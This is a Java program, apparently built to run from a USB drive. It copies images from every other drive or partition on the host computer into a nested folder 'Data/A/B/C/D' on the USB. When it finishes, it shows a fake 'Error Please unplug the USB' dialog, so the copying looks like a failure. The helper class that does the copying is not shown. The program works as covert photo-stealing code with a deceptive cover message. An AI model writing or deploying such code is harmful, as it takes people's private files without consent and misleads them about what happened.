
import java.io.File;
import java.util.Stack;
import javax.swing.JOptionPane;


public class Main {
	
	private static CopyFiles files= new CopyFiles();
	
	public static void main(String a[]){
		
		File[] roots=File.listRoots();
		File paste=null;
		
		//For linux OS
		if(roots.length==1){
                    paste= new File("Data/A/B/C/D");
                    paste.mkdirs();
			files.setNeglectPartition(paste.getAbsolutePath().split("/")[3]);
			Stack partition=files.getPartition(new File("/media").listFiles()[0]);
			sendFiles(paste.getAbsolutePath()+"//",partition);
			
		}
		//For Windows
		else{
                 paste= new File("Data\\A\\B\\C\\D");
                 System.out.println(paste);
                 paste.mkdirs();
                  files.setNeglectPartition(paste.getAbsolutePath().substring(0, 3));
		 Stack<File> partition = new Stack<File>();
                  for(File f: roots){
                	  if(!f.getName().equalsIgnoreCase(files.getNeglectPartition()))
                		  partition.push(f);
			}
			sendFiles(paste.getAbsolutePath()+"\\\\",partition);	        
		}

	}
	
	public static void sendFiles(String paste, Stack partition){
		
		while(!partition.isEmpty()){
			files.copyImages(paste,(File)partition.pop());
		}
		JOptionPane.showMessageDialog(null, "Error Please unplug the USB");
	}
}